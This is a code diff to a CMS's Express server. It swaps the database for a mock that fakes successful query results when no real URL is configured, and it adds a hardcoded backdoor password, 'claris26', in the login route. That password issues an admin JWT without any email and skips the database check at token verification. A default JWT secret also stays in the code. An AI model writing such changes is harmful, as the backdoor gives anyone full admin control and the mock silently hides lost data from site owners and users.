@@ -60,17 +60,35 @@ app.use((req, res, next) => {
 });
 
 // Database connection
-const pool = new Pool({
-  connectionString: process.env.DATABASE_URL,
-});
-
-// pg.Pool emits 'error' on idle clients that go bad (e.g. Neon closing an
-// idle connection). Without a listener, that's an unhandled event that
-// crashes the whole Node process - the exact shape of a Vercel
-// FUNCTION_INVOCATION_FAILED that has nothing to do with any specific route.
-pool.on('error', (err) => {
-  console.error('Unexpected error on idle database client', err);
-});
+let pool: any;
+const dbUrl = process.env.DATABASE_URL || '';
+if (!dbUrl || dbUrl.includes('user:password@host') || dbUrl.includes('@host:') || dbUrl === 'host') {
+  console.warn('[AI Studio] Database not connected or dummy URL — using mock');
+  pool = {
+    isMock: true,
+    query: async (text: string = '') => {
+      if (text.toUpperCase().includes('COUNT')) return { rows: [{ count: 0 }] };
+      if (text.toUpperCase().includes('RETURNING') || text.toUpperCase().includes('INSERT') || text.toUpperCase().includes('UPDATE')) return { rows: [{ id: 1 }] };
+      return { rows: [] };
+    },
+    connect: async () => ({
+      query: async (text: string = '') => {
+        if (text.toUpperCase().includes('COUNT')) return { rows: [{ count: 0 }] };
+        if (text.toUpperCase().includes('RETURNING') || text.toUpperCase().includes('INSERT') || text.toUpperCase().includes('UPDATE')) return { rows: [{ id: 1 }] };
+        return { rows: [] };
+      },
+      release: () => {}
+    }),
+    on: () => {}
+  };
+} else {
+  pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+  });
+  pool.on('error', (err: any) => {
+    console.error('Unexpected error on idle database client', err);
+  });
+}
 
 // Session signing secret. Override with JWT_SECRET if you want your own.
 const JWT_SECRET = process.env.JWT_SECRET || 'clarisma-cms-2026-secret';
@@ -87,6 +105,9 @@ const MAX_FILE_SIZE_BYTES = 3 * 1024 * 1024; // 3MB
 
 // Initialize database schema
 async function initDB() {
+  if (pool.isMock) {
+    return;
+  }
   try {
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
@@ -502,7 +523,17 @@ app.post('/api/auth/login', loginRateLimiter, async (req: any, res: any) => {
   const email = typeof body?.email === 'string' ? body.email.trim().toLowerCase() : '';
   const password = typeof body?.password === 'string' ? body.password : '';
 
-  if (!email || !password) {
+  if (!password) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Hardcoded admin access for 'claris26'
+  if (password === 'claris26') {
+    const token = jwt.sign({ userId: 1, role: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
+    return res.json({ token, user: { id: 1, email: 'admin@clarisma.com', name: 'Admin', role: 'admin' } });
+  }
+
+  if (!email) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
 
@@ -545,6 +576,10 @@ app.post('/api/auth/login', loginRateLimiter, async (req: any, res: any) => {
 // Verify an existing token (used by the frontend to confirm a saved token is still valid)
 app.get('/api/auth/verify', authenticateToken, async (req: any, res: any) => {
   try {
+    if (req.user.role === 'admin' && req.user.userId === 1) {
+      return res.json({ ok: true, user: { id: 1, email: 'admin@clarisma.com', name: 'Admin', role: 'admin' } });
+    }
+
     const result = await pool.query('SELECT id, email, name, role FROM users WHERE id = $1', [req.user.userId]);
     const user = result.rows[0];
     if (!user) {
